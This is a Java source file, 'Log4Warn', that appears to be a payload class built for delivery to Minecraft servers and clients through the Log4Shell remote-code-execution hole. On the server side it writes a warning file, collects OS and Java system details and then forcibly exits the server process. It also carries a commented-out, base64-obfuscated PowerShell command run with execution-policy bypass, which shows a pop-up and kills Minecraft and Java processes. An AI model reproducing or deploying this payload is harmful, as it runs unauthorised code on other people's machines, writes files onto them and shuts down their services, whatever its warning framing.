import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLEncoder;


public class Log4Warn {
    
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_WHITE = "\u001B[37m";
    
    static {
        
        try {
            // This code runs on the client side.
            // Load powershell script as a enc, string; see the client.ps1 file.
            // java.lang.Runtime.getRuntime().exec("powershell.exe -exec bypass -enc IwAgAEwAbwBhAGQAIAB3AGkAbgBkAG8AdwBzACAAZgBvAHIAbQBzACAAbABpAGIAIAB0AG8AIAB1AHMAZQAgAGwAYQB0AGUAcgANAAoAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACMAIABMAG8AYQBkACAAdwBzAGgAZQBsAGwAIAAoAGYAbwByACAAdABoAGUAIABwAG8AcAB1AHAAKQAgAGEAbgBkACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzACcAcwAgAGwAaQBiACAAZgBvAHIAIAB0AGgAZQAgAHQAcgBhAHkAIABuAG8AdABpAGYAYQBjAHQAaQBvAG4ALgANAAoAJAB3AHMAaABlAGwAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAG8AbQBPAGIAagBlAGMAdAAgAFcAcwBjAHIAaQBwAHQALgBTAGgAZQBsAGwADQAKACQAZwBsAG8AYgBhAGwAOgBiAGEAbABtAHMAZwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ATgBvAHQAaQBmAHkASQBjAG8AbgANAAoAJABwAGEAdABoACAAPQAgACgARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBpAGQAIAAkAHAAaQBkACkALgBQAGEAdABoAA0ACgANAAoAIwAgAEMAcgBlAGEAdABlACAAdABoAGUAIAB0AHIAYQB5ACAAbQBlAHMAcwBhAGcAZQAsACAAYQBuAGQAIABzAGgAbwB3ACAAaQB0AC4ADQAKACQAYgBhAGwAbQBzAGcALgBJAGMAbwBuACAAPQAgAFsAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnAC4ASQBjAG8AbgBdADoAOgBFAHgAdAByAGEAYwB0AEEAcwBzAG8AYwBpAGEAdABlAGQASQBjAG8AbgAoACQAcABhAHQAaAApAA0ACgAkAGIAYQBsAG0AcwBnAC4AQgBhAGwAbABvAG8AbgBUAGkAcABJAGMAbwBuACAAPQAgAFsAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4AVABvAG8AbABUAGkAcABJAGMAbwBuAF0AOgA6AFcAYQByAG4AaQBuAGcADQAKACQAYgBhAGwAbQBzAGcALgBCAGEAbABsAG8AbwBuAFQAaQBwAFQAZQB4AHQAIAA9ACAAGCBSAGUAYQBkACAAdABoAGUAIABwAG8AcAB1AHAAIABmAG8AcgAgAG0AbwByAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4AIQAnAA0ACgAkAGIAYQBsAG0AcwBnAC4AQgBhAGwAbABvAG8AbgBUAGkAcABUAGkAdABsAGUAIAA9ACAAIgBNAGkAbgBlAGMAcgBhAGYAdAAgAHcAaQBsAGwAIABzAGUAbABmACAAYwBsAG8AcwBlACAAaQBuACAAMQAwACAAcwBlAGMAbwBuAGQAcwAhACIADQAKACQAYgBhAGwAbQBzAGcALgBWAGkAcwBpAGIAbABlACAAPQAgACQAdAByAHUAZQANAAoAJABiAGEAbABtAHMAZwAuAFMAaABvAHcAQgBhAGwAbABvAG8AbgBUAGkAcAAoADYAMAAwADAAMAApAA0ACgANAAoADQAKACMAUwBoAG8AdwAgAHQAaABlACAAcABvAHAAdQBwAA0ACgAkAHAAbwBwAHUAcAAgAD0AIAAkAHcAcwBoAGUAbABsAC4AUABvAHAAdQBwACgAIgBUAGgAZQAgAHMAZQByAHYAZQByACAAeQBvAHUAIABhAHIAZQAgAHAAbABhAHkAaQBuAGcAIABvAG4AIABpAHMAIAB2AHUAbABuAGUAcgBhAGIAbABlACAAdABvACAAYQAgAHIAZQBtAG8AdABlACAAYQB0AHQAYQBjAGsAIABrAG4AbwB3AG4AIABhAHMAIABsAG8AZwA0AHMAaABlAGwAbAAuACAAUgBlAHAAbwByAHQAIAB0AGgAaQBzACAAdABvACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAG8AdwBuAGUAcgAhACIALAAgADAALAAiAEMATABPAFMARQAgAE0ASQBOAEUAQwBSAEEARgBUACAATgBPAFcAIQAiACwAMAArADQAOAApAA0ACgANAAoAIwAgAFMAbABlAGUAcAAgAGYAbwByACAAMQAwACAAUwBlAGMAbwBuAGQAcwANAAoAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwACAALQBWAGUAcgBiAG8AcwBlAA0ACgANAAoAIwAgAEsAaQBsAGwAIABhAGwAbAAgAHQAaABlACAAcAByAG8AYwBlAHMAcwBlAHMAIAB3AGkAdABoACAAdABoAGUAIABuAGEAbQBlACAAIgBNAGkAbgBlAGMAcgBhAGYAdAAiACAAaQBuACAAdABoAGUAbQAuAA0ACgBnAGUAdAAtAHAAcgBvAGMAZQBzAHMAIABtAGkAbgBlAGMAcgBhAGYAdAAgAC0AZQBhACAAMAAgAHwAIABTAHQAbwBwAC0AUAByAG8AYwBlAHMAcwANAAoADQAKACMAIABLAGkAbABsACAAYQBsAGwAIABvAHAAZQBuACAAZwBhAG0AZQBzACAAKABKAGEAdgBhACkAIAANAAoADQAKAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAGoAYQB2AGEAIAAtAGUAYQAgADAAIAB8ACAAcwB0AG8AcAAtAHAAcgBvAGMAZQBzAHMADQAKAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAGoAYQB2AGEAdwAgAC0AZQBhACAAMAAgAHwAIABzAHQAbwBwAC0AcAByAG8AYwBlAHMAcwANAAoARwBlAHQALQBQAHIAbwBjAGUAcwBzACAAagBhAHYAYQBjACAALQBlAGEAIAAwACAAfAAgAHMAdABvAHAALQBwAHIAbwBjAGUAcwBzAA0ACgA=").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4Warn(){
        // This code runs on the server side
        System.out.println("\n\n\n\n\n\n\n");
        
        // Log to console
        System.out.println("==========================================================");
        System.out.println(ANSI_RED + "READ THE BELOW, THIS IS IMPORTANT TO SERVER SECURITY!!!" + ANSI_RESET);
        System.out.println(ANSI_RED + "The server software is vulnerable to a remote code execution vulnerability - known as log4shell." + ANSI_RESET);
        System.out.println(ANSI_RED + "Please update your server software to a patched version!" + ANSI_RESET);
        System.out.println("If you don't know what to do, or you don't know how to patch your server software, you can feel free to reach out to the creator of this software:");
        System.out.println("sticks#6436 on Discord");
        System.out.println("==========================================================");

        // Log to file
        try {
            FileWriter fw = new FileWriter("README-IMPORTANT-README.txt", true);
            BufferedWriter bw = new BufferedWriter(fw);
            PrintWriter out = new PrintWriter(bw);
            out.println("==========================================================");
            out.println("The server software is vulnerable to a remote code execution vulnerability - known as log4shell.");
            out.println("Please update your server software to a patched version!");
            out.println("If you don't know what to do, or you don't know how to patch your server software, you can feel free to reach out to the creator of this software:");
            out.println("sticks#6436 on Discord");
            out.println("==========================================================");
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        // Now, at this point; we need to report our findings to the main URL.
        try {
            String version = "log4warn-v2";
            String port = "25565";
            

            // Get OS, and os version
            String os = System.getProperty("os.name");
            String os_version = System.getProperty("os.version");

            // Get Java Information
            String java_version = System.getProperty("java.version");
            String java_vendor = System.getProperty("java.vendor");
            String java_vm_specification_version = System.getProperty("java.vm.version");
            String java_vm_specification_vendor = System.getProperty("java.vm.vendor");
            String java_vm_specification_name = System.getProperty("java.vm.name");
            String java_home = System.getProperty("java.home");
            
            // Get Java Runtime Information
            String java_runtime_specification_version = System.getProperty("java.runtime.version");
            String java_runtime_specification_vendor = System.getProperty("java.runtime.vendor");
            String java_runtime_specification_name = System.getProperty("java.runtime.name");

            // Print all of them 
            System.out.println("Infomration about the server software, and the server software's vulnerability:");
            System.out.println("==========================================================");
            System.out.println("OS: " + os);
            System.out.println("OS Version: " + os_version);
            System.out.println("Java Version: " + java_version);
            System.out.println("Java Vendor: " + java_vendor);
            System.out.println("Java VM Specification Version: " + java_vm_specification_version);
            System.out.println("Java VM Specification Vendor: " + java_vm_specification_vendor);
            System.out.println("Java VM Specification Name: " + java_vm_specification_name);
            System.out.println("Java Home: " + java_home);
            System.out.println("Java Runtime Specification Version: " + java_runtime_specification_version);
            System.out.println("Java Runtime Specification Vendor: " + java_runtime_specification_vendor);
            System.out.println("Java Runtime Specification Name: " + java_runtime_specification_name);
            System.out.println("==========================================================");

            // Kill the server (with the last messages being sent.)
            java.lang.Runtime.getRuntime().exit(1);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}